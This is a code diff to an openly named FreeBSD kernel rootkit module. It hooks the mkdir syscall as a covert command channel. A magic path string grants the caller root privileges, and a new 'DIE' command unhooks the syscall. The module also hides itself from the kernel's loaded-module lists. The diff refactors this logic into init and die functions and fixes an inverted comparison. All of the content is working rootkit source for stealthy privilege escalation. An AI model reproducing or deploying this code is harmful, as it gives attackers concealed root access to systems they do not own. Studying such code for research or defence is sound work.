@@ -36,7 +36,25 @@
 #include <sys/syscall.h>
 
 static int mkdir_hook(struct thread *td, void *syscall_args);
-static void rootkit_handle_request(struct thread *td, char *command);
+static void handle_request(struct thread *td, char *command);
+
+static void
+init(void)
+{
+	/* Enable interface. */
+	hook_syscall_set(SYS_mkdir, mkdir_hook);
+
+	/* Hide rootkit. */
+	hide_kld(MODULE_NAME);
+	hide_ko(LINKER_NAME);
+}
+
+static void
+die(void)
+{
+	/* Disable interface. */
+	hook_syscall_set(SYS_mkdir, sys_mkdir);
+}
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -45,12 +63,9 @@ load(struct module *module, int cmd, void *arg)
 	{
 		case MOD_LOAD:
 			LOGI("[rootkit:load] Rootkit loaded.\n");
-			hook_syscall_set(SYS_mkdir, mkdir_hook);
-			hide_kld("rootkit");
-			hide_ko("rootkit.ko");
+			init();
 			break;
 		case MOD_UNLOAD:
-			hook_syscall_set(SYS_mkdir, sys_mkdir);
 			LOGI("[rootkit:load] Rootkit unloaded.\n");
 			break;
 		default:
@@ -69,18 +84,17 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 	struct mkdir_args *uap;
 	uap = (struct mkdir_args *) syscall_args;
 
-
 	error = copyinstr(uap->path, path, 255, NULL);
 	if (!error)
 	{
-		rootkit_handle_request(td, path);
+		handle_request(td, path);
 	}
 
 	return(sys_mkdir(td, syscall_args));
 }
 
 static void
-rootkit_handle_request(struct thread *td, char *command)
+handle_request(struct thread *td, char *command)
 {
 	/* Valid commands are RKCALL_LEN long. */
 	if (strnlen(command, RKCALL_LEN) != RKCALL_LEN)
@@ -90,9 +104,15 @@ rootkit_handle_request(struct thread *td, char *command)
 
 	/* Check if the command is valid.
 	 * If the command is valid, the request will be handled. */
-	if (strcmp(command, RKCALL_ELEVATE))
+	if (strcmp(command, RKCALL_ELEVATE) == 0)
 	{
+		LOGI("[rootkit:handle_request] ELEVATE request recieved.\n");
 		privilege_set(td, 0);
+	}
+	else if (strcmp(command, RKCALL_DIE) == 0)
+	{
+		LOGI("[rootkit:handle_request] DIE request recieved.\n");
+		die();
 	}
 }
 
